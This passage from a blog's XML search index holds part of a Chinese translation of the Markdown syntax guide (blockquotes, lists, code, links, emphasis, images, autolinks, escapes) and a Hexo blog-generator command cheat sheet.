这是 H6</code></pre><p>你可以选择性地「闭合」类 atx 样式的标题，这纯粹只是美观用的，若是觉得这样看起来比较舒适，你就可以在行尾加上 <code>#</code>，而行尾的 <code>#</code> 数量也不用和开头一样（行首的井字符数量决定标题的阶数）：</p><pre><code># 这是 H1 ### 这是 H2 ##### 这是 H3 ######</code></pre><h3 id="blockquote">区块引用 Blockquotes</h3><p>Markdown 标记区块引用是使用类似 email 中用 <code>&gt;</code> 的引用方式。如果你还熟悉在 email 信件中的引言部分，你就知道怎么在 Markdown 文件中建立一个区块引用，那会看起来像是你自己先断好行，然后在每行的最前面加上 <code>&gt;</code> ：</p><pre><code>&gt; This is a blockquote with two paragraphs. Lorem ipsum dolor sit amet,&gt; consectetuer adipiscing elit. Aliquam hendrerit mi posuere lectus.&gt; Vestibulum enim wisi, viverra nec, fringilla in, laoreet vitae, risus.&gt;&gt; Donec sit amet nisl. Aliquam semper ipsum sit amet velit. Suspendisse&gt; id sem consectetuer libero luctus adipiscing.</code></pre><p>Markdown 也允许你偷懒只在整个段落的第一行最前面加上 <code>&gt;</code> ：</p><pre><code>&gt; This is a blockquote with two paragraphs. Lorem ipsum dolor sit amet,consectetuer adipiscing elit. Aliquam hendrerit mi posuere lectus.Vestibulum enim wisi, viverra nec, fringilla in, laoreet vitae, risus.&gt; Donec sit amet nisl. Aliquam semper ipsum sit amet velit. Suspendisseid sem consectetuer libero luctus adipiscing.</code></pre><p>区块引用可以嵌套（例如：引用内的引用），只要根据层次加上不同数量的 <code>&gt;</code> ：</p><pre><code>&gt; This is the first level of quoting.&gt;&gt; &gt; This is nested blockquote.&gt;&gt; Back to the first level.</code></pre><p>引用的区块内也可以使用其他的 Markdown 语法，包括标题、列表、代码区块等：</p><pre><code>&gt; ## 这是一个标题。&gt;&gt; 1.   这是第一行列表项。&gt; 2.   这是第二行列表项。&gt;&gt; 给出一些例子代码：&gt;&gt;     return shell_exec("echo $input | $markdown_script");</code></pre><p>任何像样的文本编辑器都能轻松地建立 email 型的引用。例如在 BBEdit 中，你可以选取文字后然后从选单中选择<em>增加引用阶层</em>。</p><h3 id="list">列表</h3><p>Markdown 支持有序列表和无序列表。</p><p>无序列表使用星号、加号或是减号作为列表标记：</p><pre><code>*   Red*   Green*   Blue</code></pre><p>等同于：</p><pre><code>+   Red+   Green+   Blue</code></pre><p>也等同于：</p><pre><code>-   Red-   Green-   Blue</code></pre><p>有序列表则使用数字接着一个英文句点：</p><pre><code>1.  Bird2.  McHale3.  Parish</code></pre><p>很重要的一点是，你在列表标记上使用的数字并不会影响输出的 HTML 结果，上面的列表所产生的 HTML 标记为：</p><pre><code>&lt;ol&gt;&lt;li&gt;Bird&lt;/li&gt;&lt;li&gt;McHale&lt;/li&gt;&lt;li&gt;Parish&lt;/li&gt;&lt;/ol&gt;</code></pre><p>如果你的列表标记写成：</p><pre><code>1.  Bird1.  McHale1.  Parish</code></pre><p>或甚至是：</p><pre><code>3. Bird1. McHale8. Parish</code></pre><p>你都会得到完全相同的 HTML 输出。重点在于，你可以让 Markdown 文件的列表数字和输出的结果相同，或是你懒一点，你可以完全不用在意数字的正确性。</p><p>如果你使用懒惰的写法，建议第一个项目最好还是从 1. 开始，因为 Markdown 未来可能会支持有序列表的 start 属性。</p><p>列表项目标记通常是放在最左边，但是其实也可以缩进，最多 3 个空格，项目标记后面则一定要接着至少一个空格或制表符。</p><p>要让列表看起来更漂亮，你可以把内容用固定的缩进整理好：</p><pre><code>*   Lorem ipsum dolor sit amet, consectetuer adipiscing elit.    Aliquam hendrerit mi posuere lectus. Vestibulum enim wisi,    viverra nec, fringilla in, laoreet vitae, risus.*   Donec sit amet nisl. Aliquam semper ipsum sit amet velit.    Suspendisse id sem consectetuer libero luctus adipiscing.</code></pre><p>但是如果你懒，那也行：</p><pre><code>*   Lorem ipsum dolor sit amet, consectetuer adipiscing elit.Aliquam hendrerit mi posuere lectus. Vestibulum enim wisi,viverra nec, fringilla in, laoreet vitae, risus.*   Donec sit amet nisl. Aliquam semper ipsum sit amet velit.Suspendisse id sem consectetuer libero luctus adipiscing.</code></pre><p>如果列表项目间用空行分开，在输出 HTML 时 Markdown 就会将项目内容用 <code>&lt;p&gt;</code>标签包起来，举例来说：</p><pre><code>*   Bird*   Magic</code></pre><p>会被转换为：</p><pre><code>&lt;ul&gt;&lt;li&gt;Bird&lt;/li&gt;&lt;li&gt;Magic&lt;/li&gt;&lt;/ul&gt;</code></pre><p>但是这个：</p><pre><code>*   Bird*   Magic</code></pre><p>会被转换为：</p><pre><code>&lt;ul&gt;&lt;li&gt;&lt;p&gt;Bird&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;Magic&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;</code></pre><p>列表项目可以包含多个段落，每个项目下的段落都必须缩进 4 个空格或是 1 个制表符：</p><pre><code>1.  This is a list item with two paragraphs. Lorem ipsum dolor    sit amet, consectetuer adipiscing elit. Aliquam hendrerit    mi posuere lectus.    Vestibulum enim wisi, viverra nec, fringilla in, laoreet    vitae, risus. Donec sit amet nisl. Aliquam semper ipsum    sit amet velit.2.  Suspendisse id sem consectetuer libero luctus adipiscing.</code></pre><p>如果你每行都有缩进，看起来会看好很多，当然，再次地，如果你很懒惰，Markdown 也允许：</p><pre><code>*   This is a list item with two paragraphs.    This is the second paragraph in the list item. You'reonly required to indent the first line. Lorem ipsum dolorsit amet, consectetuer adipiscing elit.*   Another item in the same list.</code></pre><p>如果要在列表项目内放进引用，那 <code>&gt;</code> 就需要缩进：</p><pre><code>*   A list item with a blockquote:    &gt; This is a blockquote    &gt; inside a list item.</code></pre><p>如果要放代码区块的话，该区块就需要缩进<em>两次</em>，也就是 8 个空格或是 2 个制表符：</p><pre><code>*   一列表项包含一个列表区块：        &lt;代码写在这&gt;</code></pre><p>当然，项目列表很可能会不小心产生，像是下面这样的写法：</p><pre><code>1986. What a great season.</code></pre><p>换句话说，也就是在行首出现<em>数字-句点-空白</em>，要避免这样的状况，你可以在句点前面加上反斜杠。</p><pre><code>1986\. What a great season.</code></pre><h3 id="precode">代码区块</h3><p>和程序相关的写作或是标签语言原始码通常会有已经排版好的代码区块，通常这些区块我们并不希望它以一般段落文件的方式去排版，而是照原来的样子显示，Markdown 会用 <code>&lt;pre&gt;</code> 和 <code>&lt;code&gt;</code> 标签来把代码区块包起来。</p><p>要在 Markdown 中建立代码区块很简单，只要简单地缩进 4 个空格或是 1 个制表符就可以，例如，下面的输入：</p><pre><code>这是一个普通段落：    这是一个代码区块。</code></pre><p>Markdown 会转换成：</p><pre><code>&lt;p&gt;这是一个普通段落：&lt;/p&gt;&lt;pre&gt;&lt;code&gt;这是一个代码区块。&lt;/code&gt;&lt;/pre&gt;</code></pre><p>这个每行一阶的缩进（4 个空格或是 1 个制表符），都会被移除，例如：</p><pre><code>Here is an example of AppleScript:    tell application "Foo"        beep    end tell</code></pre><p>会被转换为：</p><pre><code>&lt;p&gt;Here is an example of AppleScript:&lt;/p&gt;&lt;pre&gt;&lt;code&gt;tell application "Foo"    beepend tell&lt;/code&gt;&lt;/pre&gt;</code></pre><p>一个代码区块会一直持续到没有缩进的那一行（或是文件结尾）。</p><p>在代码区块里面， <code>&amp;</code> 、 <code>&lt;</code> 和 <code>&gt;</code> 会自动转成 HTML 实体，这样的方式让你非常容易使用 Markdown 插入范例用的 HTML 原始码，只需要复制贴上，再加上缩进就可以了，剩下的 Markdown 都会帮你处理，例如：</p><pre><code>    &lt;div class="footer"&gt;        &amp;copy; 2004 Foo Corporation    &lt;/div&gt;</code></pre><p>会被转换为：</p><pre><code>&lt;pre&gt;&lt;code&gt;&amp;lt;div class="footer"&amp;gt;    &amp;amp;copy; 2004 Foo Corporation&amp;lt;/div&amp;gt;&lt;/code&gt;&lt;/pre&gt;</code></pre><p>代码区块中，一般的 Markdown 语法不会被转换，像是星号便只是星号，这表示你可以很容易地以 Markdown 语法撰写 Markdown 语法相关的文件。</p><h3 id="hr">分隔线</h3><p>你可以在一行中用三个以上的星号、减号、底线来建立一个分隔线，行内不能有其他东西。你也可以在星号或是减号中间插入空格。下面每种写法都可以建立分隔线：</p><pre><code>* * *********- - ----------------------------------------</code></pre><hr><h2 id="span">区段元素</h2><h3 id="link">链接</h3><p>Markdown 支持两种形式的链接语法： <em>行内式</em>和<em>参考式</em>两种形式。</p><p>不管是哪一种，链接文字都是用 [方括号] 来标记。</p><p>要建立一个<em>行内式</em>的链接，只要在方块括号后面紧接着圆括号并插入网址链接即可，如果你还想要加上链接的 title 文字，只要在网址后面，用双引号把 title 文字包起来即可，例如：</p><pre><code>This is [an example](http://example.com/ "Title") inline link.[This link](http://example.net/) has no title attribute.</code></pre><p>会产生：</p><pre><code>&lt;p&gt;This is &lt;a href="http://example.com/" title="Title"&gt;an example&lt;/a&gt; inline link.&lt;/p&gt;&lt;p&gt;&lt;a href="http://example.net/"&gt;This link&lt;/a&gt; has notitle attribute.&lt;/p&gt;</code></pre><p>如果你是要链接到同样主机的资源，你可以使用相对路径：</p><pre><code>See my [About](/about/) page for details.</code></pre><p><em>参考式</em>的链接是在链接文字的括号后面再接上另一个方括号，而在第二个方括号里面要填入用以辨识链接的标记：</p><pre><code>This is [an example][id] reference-style link.</code></pre><p>你也可以选择性地在两个方括号中间加上一个空格：</p><pre><code>This is [an example] [id] reference-style link.</code></pre><p>接着，在文件的任意处，你可以把这个标记的链接内容定义出来：</p><pre><code>[id]: http://example.com/  "Optional Title Here"</code></pre><p>链接内容定义的形式为：</p><ul><li>方括号（前面可以选择性地加上至多三个空格来缩进），里面输入链接文字</li><li>接着一个冒号</li><li>接着一个以上的空格或制表符</li><li>接着链接的网址</li><li>选择性地接着 title 内容，可以用单引号、双引号或是括弧包着</li></ul><p>下面这三种链接的定义都是相同：</p><pre><code>[foo]: http://example.com/  "Optional Title Here"[foo]: http://example.com/  'Optional Title Here'[foo]: http://example.com/  (Optional Title Here)</code></pre><p><strong>请注意：</strong>有一个已知的问题是 Markdown.pl 1.0.1 会忽略单引号包起来的链接 title。</p><p>链接网址也可以用方括号包起来：</p><pre><code>[id]: &lt;http://example.com/&gt;  "Optional Title Here"</code></pre><p>你也可以把 title 属性放到下一行，也可以加一些缩进，若网址太长的话，这样会比较好看：</p><pre><code>[id]: http://example.com/longish/path/to/resource/here    "Optional Title Here"</code></pre><p>网址定义只有在产生链接的时候用到，并不会直接出现在文件之中。</p><p>链接辨别标签可以有字母、数字、空白和标点符号，但是并<em>不</em>区分大小写，因此下面两个链接是一样的：</p><pre><code>[link text][a][link text][A]</code></pre><p><em>隐式链接标记</em>功能让你可以省略指定链接标记，这种情形下，链接标记会视为等同于链接文字，要用隐式链接标记只要在链接文字后面加上一个空的方括号，如果你要让 "Google" 链接到 google.com，你可以简化成：</p><pre><code>[Google][]</code></pre><p>然后定义链接内容：</p><pre><code>[Google]: http://google.com/</code></pre><p>由于链接文字可能包含空白，所以这种简化型的标记内也许包含多个单词：</p><pre><code>Visit [Daring Fireball][] for more information.</code></pre><p>然后接着定义链接：</p><pre><code>[Daring Fireball]: http://daringfireball.net/</code></pre><p>链接的定义可以放在文件中的任何一个地方，我比较偏好直接放在链接出现段落的后面，你也可以把它放在文件最后面，就像是注解一样。</p><p>下面是一个参考式链接的范例：</p><pre><code>I get 10 times more traffic from [Google] [1] than from[Yahoo] [2] or [MSN] [3].  [1]: http://google.com/        "Google"  [2]: http://search.yahoo.com/  "Yahoo Search"  [3]: http://search.msn.com/    "MSN Search"</code></pre><p>如果改成用链接名称的方式写：</p><pre><code>I get 10 times more traffic from [Google][] than from[Yahoo][] or [MSN][].  [google]: http://google.com/        "Google"  [yahoo]:  http://search.yahoo.com/  "Yahoo Search"  [msn]:    http://search.msn.com/    "MSN Search"</code></pre><p>上面两种写法都会产生下面的 HTML。</p><pre><code>&lt;p&gt;I get 10 times more traffic from &lt;a href="http://google.com/"title="Google"&gt;Google&lt;/a&gt; than from&lt;a href="http://search.yahoo.com/" title="Yahoo Search"&gt;Yahoo&lt;/a&gt;or &lt;a href="http://search.msn.com/" title="MSN Search"&gt;MSN&lt;/a&gt;.&lt;/p&gt;</code></pre><p>下面是用行内式写的同样一段内容的 Markdown 文件，提供作为比较之用：</p><pre><code>I get 10 times more traffic from [Google](http://google.com/ "Google")than from [Yahoo](http://search.yahoo.com/ "Yahoo Search") or[MSN](http://search.msn.com/ "MSN Search").</code></pre><p>参考式的链接其实重点不在于它比较好写，而是它比较好读，比较一下上面的范例，使用参考式的文章本身只有 81 个字符，但是用行内形式的却会增加到 176 个字元，如果是用纯 HTML 格式来写，会有 234 个字元，在 HTML 格式中，标签比文本还要多。</p><p>使用 Markdown 的参考式链接，可以让文件更像是浏览器最后产生的结果，让你可以把一些标记相关的元数据移到段落文字之外，你就可以增加链接而不让文章的阅读感觉被打断。</p><h3 id="em">强调</h3><p>Markdown 使用星号（<code>*</code>）和底线（<code>_</code>）作为标记强调字词的符号，被 <code>*</code> 或 <code>_</code> 包围的字词会被转成用 <code>&lt;em&gt;</code> 标签包围，用两个 <code>*</code> 或 <code>_</code> 包起来的话，则会被转成 <code>&lt;strong&gt;</code>，例如：</p><pre><code>*single asterisks*_single underscores_**double asterisks**__double underscores__</code></pre><p>会转成：</p><pre><code>&lt;em&gt;single asterisks&lt;/em&gt;&lt;em&gt;single underscores&lt;/em&gt;&lt;strong&gt;double asterisks&lt;/strong&gt;&lt;strong&gt;double underscores&lt;/strong&gt;</code></pre><p>你可以随便用你喜欢的样式，唯一的限制是，你用什么符号开启标签，就要用什么符号结束。</p><p>强调也可以直接插在文字中间：</p><pre><code>un*frigging*believable</code></pre><p>但是<strong>如果你的 <code>*</code> 和 <code>_</code> 两边都有空白的话，它们就只会被当成普通的符号</strong>。</p><p>如果要在文字前后直接插入普通的星号或底线，你可以用反斜线：</p><pre><code>\*this text is surrounded by literal asterisks\*</code></pre><h3 id="code">代码</h3><p>如果要标记一小段行内代码，你可以用反引号把它包起来（<code>`</code>），例如：</p><pre><code>Use the `printf()` function.</code></pre><p>会产生：</p><pre><code>&lt;p&gt;Use the &lt;code&gt;printf()&lt;/code&gt; function.&lt;/p&gt;</code></pre><p>如果要在代码区段内插入反引号，你可以用多个反引号来开启和结束代码区段：</p><pre><code>``There is a literal backtick (`) here.``</code></pre><p>这段语法会产生：</p><pre><code>&lt;p&gt;&lt;code&gt;There is a literal backtick (`) here.&lt;/code&gt;&lt;/p&gt;</code></pre><p>代码区段的起始和结束端都可以放入一个空白，起始端后面一个，结束端前面一个，这样你就可以在区段的一开始就插入反引号：</p><pre><code>A single backtick in a code span: `` ` ``A backtick-delimited string in a code span: `` `foo` ``</code></pre><p>会产生：</p><pre><code>&lt;p&gt;A single backtick in a code span: &lt;code&gt;`&lt;/code&gt;&lt;/p&gt;&lt;p&gt;A backtick-delimited string in a code span: &lt;code&gt;`foo`&lt;/code&gt;&lt;/p&gt;</code></pre><p>在代码区段内，<code>&amp;</code> 和方括号<strong>都</strong>会被自动地转成 HTML 实体，这使得插入 HTML 原始码变得很容易，Markdown 会把下面这段：</p><pre><code>Please don't use any `&lt;blink&gt;` tags.</code></pre><p>转为：</p><pre><code>&lt;p&gt;Please don't use any &lt;code&gt;&amp;lt;blink&amp;gt;&lt;/code&gt; tags.&lt;/p&gt;</code></pre><p>你也可以这样写：</p><pre><code>`&amp;#8212;` is the decimal-encoded equivalent of `&amp;mdash;`.</code></pre><p>以产生：</p><pre><code>&lt;p&gt;&lt;code&gt;&amp;amp;#8212;&lt;/code&gt; is the decimal-encodedequivalent of &lt;code&gt;&amp;amp;mdash;&lt;/code&gt;.&lt;/p&gt;</code></pre><h3 id="img">图片</h3><p>很明显地，要在纯文字应用中设计一个「自然」的语法来插入图片是有一定难度的。</p><p>Markdown 使用一种和链接很相似的语法来标记图片，同样也允许两种样式： <em>行内式</em>和<em>参考式</em>。</p><p>行内式的图片语法看起来像是：</p><pre><code>![Alt text](/path/to/img.jpg)![Alt text](/path/to/img.jpg "Optional title")</code></pre><p>详细叙述如下：</p><ul><li>一个惊叹号 <code>!</code></li><li>接着一个方括号，里面放上图片的替代文字</li><li>接着一个普通括号，里面放上图片的网址，最后还可以用引号包住并加上选择性的 'title' 文字。</li></ul><p>参考式的图片语法则长得像这样：</p><pre><code>![Alt text][id]</code></pre><p>「id」是图片参考的名称，图片参考的定义方式则和连结参考一样：</p><pre><code>[id]: url/to/image  "Optional title attribute"</code></pre><p>到目前为止， Markdown 还没有办法指定图片的宽高，如果你需要的话，你可以使用普通的 <code>&lt;img&gt;</code> 标签。</p><hr><h2 id="misc">其它</h2><h3 id="autolink">自动链接</h3><p>Markdown 支持以比较简短的自动链接形式来处理网址和电子邮件信箱，只要是用方括号包起来， Markdown 就会自动把它转成链接。一般网址的链接文字就和链接地址一样，例如：</p><pre><code>&lt;http://example.com/&gt;</code></pre><p>Markdown 会转为：</p><pre><code>&lt;a href="http://example.com/"&gt;http://example.com/&lt;/a&gt;</code></pre><p>邮址的自动链接也很类似，只是 Markdown 会先做一个编码转换的过程，把文字字符转成 16 进位码的 HTML 实体，这样的格式可以糊弄一些不好的邮址收集机器人，例如：</p><pre><code>&lt;address@example.com&gt;</code></pre><p>Markdown 会转成：</p><pre><code>&lt;a href="&amp;#x6D;&amp;#x61;i&amp;#x6C;&amp;#x74;&amp;#x6F;:&amp;#x61;&amp;#x64;&amp;#x64;&amp;#x72;&amp;#x65;&amp;#115;&amp;#115;&amp;#64;&amp;#101;&amp;#120;&amp;#x61;&amp;#109;&amp;#x70;&amp;#x6C;e&amp;#x2E;&amp;#99;&amp;#111;&amp;#109;"&gt;&amp;#x61;&amp;#x64;&amp;#x64;&amp;#x72;&amp;#x65;&amp;#115;&amp;#115;&amp;#64;&amp;#101;&amp;#120;&amp;#x61;&amp;#109;&amp;#x70;&amp;#x6C;e&amp;#x2E;&amp;#99;&amp;#111;&amp;#109;&lt;/a&gt;</code></pre><p>在浏览器里面，这段字串（其实是 <code>&lt;a href="mailto:address@example.com"&gt;address@example.com&lt;/a&gt;</code>）会变成一个可以点击的「address@example.com」链接。</p><p>（这种作法虽然可以糊弄不少的机器人，但并不能全部挡下来，不过总比什么都不做好些。不管怎样，公开你的信箱终究会引来广告信件的。）</p><h3>反斜杠</h3><p>Markdown 可以利用反斜杠来插入一些在语法中有其它意义的符号，例如：如果你想要用星号加在文字旁边的方式来做出强调效果（但不用 <code>&lt;em&gt;</code> 标签），你可以在星号的前面加上反斜杠：</p><pre><code>\*literal asterisks\*</code></pre><p>Markdown 支持以下这些符号前面加上反斜杠来帮助插入普通的符号：</p><pre><code>\   反斜线`   反引号*   星号_   底线{}  花括号[]  方括号()  括弧#   井字号+   加号-   减号.   英文句点!   惊叹号</code></pre><h1 id="扩展链接"><a href="#扩展链接" class="headerlink" title="扩展链接"></a>扩展链接</h1><p><a href="https://www.cnblogs.com/liugang-vip/p/6337580.html" target="_blank" rel="noopener">https://www.cnblogs.com/liugang-vip/p/6337580.html</a></p>]]></content>
      
      <categories>
          
          <category> Document </category>
          
      </categories>
      
      
        <tags>
            
            <tag> markdown </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>HEXO用户手册</title>
      <link href="/2018/05-20-HEXO-ALL.html"/>
      <url>/2018/05-20-HEXO-ALL.html</url>
      <content type="html"><![CDATA[<h2 id="HEXO-ALL"><a href="#HEXO-ALL" class="headerlink" title="HEXO ALL"></a>HEXO ALL</h2><h3 id="hexo"><a href="#hexo" class="headerlink" title="hexo"></a>hexo</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo -g #安装  </span><br><span class="line">npm update hexo -g #升级  </span><br><span class="line">hexo init #初始化</span><br></pre></td></tr></table></figure><h3 id="简写"><a href="#简写" class="headerlink" title="简写"></a>简写</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">hexo n &quot;我的博客&quot; == hexo new &quot;我的博客&quot; #新建文章</span><br><span class="line">hexo p == hexo publish</span><br><span class="line">hexo g == hexo generate#生成</span><br><span class="line">hexo s == hexo server #启动服务预览</span><br><span class="line">hexo d == hexo deploy#部署</span><br></pre></td></tr></table></figure><h3 id="服务器"><a href="#服务器" class="headerlink" title="服务器"></a>服务器</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">hexo server #Hexo 会监视文件变动并自动更新，您无须重启服务器。</span><br><span class="line">hexo server -s #静态模式</span><br><span class="line">hexo server -p 5000 #更改端口</span><br><span class="line">hexo server -i 192.168.1.1 #自定义 IP</span><br><span class="line"></span><br><span class="line">hexo clean #清除缓存 网页正常情况下可以忽略此条命令</span><br><span class="line">hexo g #生成静态网页</span><br><span class="line">hexo d #开始部署</span><br></pre></td></tr></table></figure><h3 id="监视文件变动"><a href="#监视文件变动" class="headerlink" title="监视文件变动"></a>监视文件变动</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hexo generate #使用 Hexo 生成静态文件快速而且简单</span><br><span class="line">hexo generate --watch #监视文件变动</span><br></pre></td></tr></table></figure><h3 id="完成后部署"><a href="#完成后部署" class="headerlink" title="完成后部署"></a>完成后部署</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">两个命令的作用是相同的</span><br><span class="line">hexo generate --deploy</span><br><span class="line">hexo deploy --generate</span><br><span class="line"></span><br><span class="line">hexo deploy -g</span><br><span class="line">hexo server -g</span><br></pre></td></tr></table></figure><h3 id="草稿"><a href="#草稿" class="headerlink" title="草稿"></a>草稿</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo publish [layout] &lt;title&gt;</span><br></pre></td></tr></table></figure><h3 id="模版"><a href="#模版" class="headerlink" title="模版"></a>模版</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">hexo new &quot;postName&quot; #新建文章</span><br><span class="line">hexo new page &quot;pageName&quot; #新建页面</span><br><span class="line">hexo generate #生成静态页面至public目录</span><br><span class="line">hexo server #开启预览访问端口（默认端口4000，&apos;ctrl + c&apos;关闭server）</span><br><span class="line">hexo deploy #将.deploy目录部署到GitHub</span><br><span class="line"></span><br><span class="line">hexo new [layout] &lt;title&gt;</span><br><span class="line">hexo new photo &quot;My Gallery&quot;</span><br><span class="line">hexo new &quot;Hello World&quot; --lang tw</span><br></pre></td></tr></table></figure><table><thead><tr><th align="left">变量</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">layout</td><td align="left">布局</td></tr><tr><td align="left">title</td><td align="left">标题</td></tr><tr><td align="left">date</td><td align="left">文件建立日期</td></tr><tr><td align="left"><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">title: 使用Hexo搭建个人博客</span><br><span class="line">layout: post</span><br><span class="line">date: 2014-03-03 19:07:43</span><br><span class="line">comments: true</span><br><span class="line">categories: Blog</span><br><span class="line">tags: [Hexo]</span><br><span class="line">keywords: Hexo, Blog</span><br><span class="line">description: 生命在于折腾，又把博客折腾到Hexo了。给Hexo点赞。</span><br></pre></td></tr></table></figure></td><td align="left"></td></tr></tbody></table><h3 id="模版（Scaffold）"><a href="#模版（Scaffold）" class="headerlink" title="模版（Scaffold）"></a>模版（Scaffold）</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new photo &quot;My Gallery&quot;</span><br></pre></td></tr></table></figure><table><thead><tr><th align="left">变量</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">layout</td><td align="left">布局</td></tr><tr><td align="left">title</td><td align="left">标题</td></tr><tr><td align="left">date</td><td align="left">文件建立日期</td></tr><tr><td align="left">### 设置文章摘要</td><td align="left"></td></tr><tr><td align="left"><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">以上是文章摘要 &lt;!--more--&gt; 以下是余下全文</span><br></pre></td></tr></table></figure></td><td align="left"></td></tr></tbody></table><h3 id="写作"><a href="#写作" class="headerlink" title="写作"></a>写作</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hexo new page &lt;title&gt;</span><br><span class="line">hexo new post &lt;title&gt;</span><br></pre></td></tr></table></figure><table><thead><tr><th align="left">变量</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">:title</td><td align="left">标题</td></tr><tr><td align="left">:year</td><td align="left">建立的年份（4 位数）</td></tr><tr><td align="left">:month</td><td align="left">建立的月份（2 位数）</td></tr><tr><td align="left">:i_month</td><td align="left">建立的月份（去掉开头的零）</td></tr><tr><td align="left">:day</td><td align="left">建立的日期（2 位数）</td></tr><tr><td align="left">:i_day</td><td align="left">建立的日期（去掉开头的零）</td></tr><tr><td align="left">### 推送到服务器上</td><td align="left"></td></tr><tr><td align="left"><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo n #写文章</span><br><span class="line">hexo g #生成</span><br><span class="line">hexo d #部署 #可与hexo g合并为 hexo d -g</span><br></pre></td></tr></table></figure></td><td align="left"></td></tr></tbody></table>]]></content>
      
      <categories>
          
          <category> Document </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
  
  
</search>
